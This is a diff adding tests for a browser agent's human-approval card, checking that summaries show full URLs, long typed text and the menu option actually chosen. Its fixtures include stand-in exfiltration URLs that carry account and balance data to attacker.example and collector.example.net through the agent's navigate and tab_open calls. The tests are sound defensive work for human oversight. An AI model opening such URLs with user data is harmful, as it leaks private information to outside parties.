@@ -438,6 +438,38 @@ describe("Auto mode", () => {
   });
 });
 
+describe("the approval card", () => {
+  it("shows the whole address, query and all: that is where data from a page would travel", async () => {
+    const url = "https://www.google.com/url?q=https://attacker.example/?d=acct+1234+balance#frag";
+    const h = harness([{ text: "", toolCalls: [call("navigate", { url })] }, { text: "", toolCalls: [call("done", { summary: "ok" })] }]);
+    await run(h);
+    expect(h.approvals[0].summary).toBe(`Open ${url}`);
+    const long = `https://collector.example.net/c?d=${"x".repeat(600)}`;
+    const h2 = harness([{ text: "", toolCalls: [call("tab_open", { url: long })] }, { text: "", toolCalls: [call("done", { summary: "ok" })] }]);
+    await run(h2);
+    expect(h2.approvals[0].summary).toContain(`(${long.length} characters)`);
+    expect(h2.approvals[0].summary.startsWith("Open https://collector.example.net/c?d=xxx")).toBe(true);
+  });
+
+  it("shows all the text to be typed, or says how long it is", async () => {
+    const text = "y".repeat(2500);
+    const h = harness([{ text: "", toolCalls: [call("type_text", { ref: "e3", text })] }, { text: "", toolCalls: [call("done", { summary: "ok" })] }]);
+    await run(h);
+    expect(h.approvals[0].summary).toContain("(2500 characters in all)");
+    expect(h.approvals[0].summary).toContain("y".repeat(2000));
+  });
+
+  it("names the option the menu will really take, which the model's words only point at", async () => {
+    const browser = fakeBrowser({
+      describe: (a) => ({ ok: true, element: { ref: String(a.ref), role: "combobox", name: "Size", tag: "select", ...(a.choose === "L" ? { choice: "XL - extra large" } : {}) } }),
+    });
+    const h = harness([{ text: "", toolCalls: [call("select_option", { ref: "e8", value: "L" })] }, { text: "", toolCalls: [call("done", { summary: "ok" })] }], { browser });
+    await run(h);
+    expect(browser.page).toHaveBeenCalledWith("describe", { ref: "e8", choose: "L" }, TAB, expect.any(AbortSignal));
+    expect(h.approvals[0].summary).toBe('Choose "XL - extra large" in "Size"');
+  });
+});
+
 describe("the trail", () => {
   it("reports each step and the run, with no typed text", async () => {
     const h = harness([
